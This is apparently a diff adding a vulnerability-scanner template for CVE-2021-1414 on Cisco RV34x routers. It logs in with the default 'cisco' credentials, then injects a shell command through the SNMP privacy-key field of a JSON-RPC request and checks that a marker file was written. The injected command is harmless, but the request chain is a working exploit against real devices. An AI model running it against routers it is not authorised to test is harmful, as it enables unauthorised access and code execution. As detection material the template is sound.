@@ -1,0 +1,67 @@
+id: cve-2021-1414
+
+info:
+  name: Cisco RV340 Auth RCE (CVE-2021-1414)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Multiple vulnerabilities in the web-based management interface of Cisco RV340, RV340W, RV345, and RV345P Dual WAN Gigabit VPN Routers could allow an authenticated, remote attacker to execute arbitrary code with elevated privileges equivalent to the web service process on an affected device.
+  reference:
+    - https://www.iot-inspector.com/blog/advisory-cisco-rv34x-authentication-bypass-remote-command-execution/
+    - https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sb-rv34x-rce-8bfG2h6b
+
+variables:
+  rand1: "{{rand_char('abcdef1234567890')}}{{rand_char('abcdef1234567890')}}"
+  rand2: "{{rand_char('abcdef1234567890')}}{{rand_char('abcdef1234567890')}}"
+  rand_name: "{{rand_char('abcdef1234567890')}}{{rand_char('abcdef1234567890')}}"
+
+flow: http(1) && http(2) && http(3)
+
+http:
+  - id: login
+    method: POST
+    path:
+      - "{{BaseURL}}/jsonrpc"
+    headers:
+      Content-Type: "application/x-www-form-urlencoded; charset=UTF-8"
+    body: |
+      {"jsonrpc":"2.0","method":"login","params":{"user":"cisco","pass":"Y2lzY28=","lang":"English"}}
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: session_id
+        internal: true
+        part: body
+        regex:
+          - "\"errstr\":\"(.*?)\","      
+
+  - id: set_snmp
+    method: POST
+    path:
+      - "{{BaseURL}}/jsonrpc"
+    headers:
+      Content-Type: "application/x-www-form-urlencoded; charset=UTF-8"
+      Cookie: "selected_language=English; sessionid={{session_id}}"
+    body: |
+      {"jsonrpc":"2.0","method":"set_snmp","params":{"snmp":{"enabled":true,"snmpVersions":{"v1":false,"v2c":false,"v3":true},"allow-access-from-wan":false,"allow-access-from-vpn":false},"SNMPv2-MIB":{"system":{"sysName":"router84AA47","sysContact":"","sysLocation":""}},"SNMP-TARGET-MIB":{"snmpTargetAddrTable":{"snmpTargetAddrEntry":[]}},"SNMP-USER-BASED-SM-MIB":{"usmUserTable":{"usmUserEntry":[{"usmUserSecurityName":"admin","usmUserEngineID":"80:00:61:81:05:01","usmUserName":"admin","usmUserPrivProtocol":"1.3.6.1.6.3.10.1.2.2","usmUserAuthProtocol":"1.3.6.1.6.3.10.1.1.2","usmUserPrivKey":"cisco;echo {{rand1}}{{rand2}} \"\" > /tmp/download/{{rand_name}}","usmUserAuthKey":"cisco"}]}}}}
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: verify_command
+    method: GET
+    path:
+      - "{{BaseURL}}/download/{{rand_name}}"
+    headers:
+      Cookie: "selected_language=English; sessionid={{session_id}}"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{rand1}}{{rand2}}"
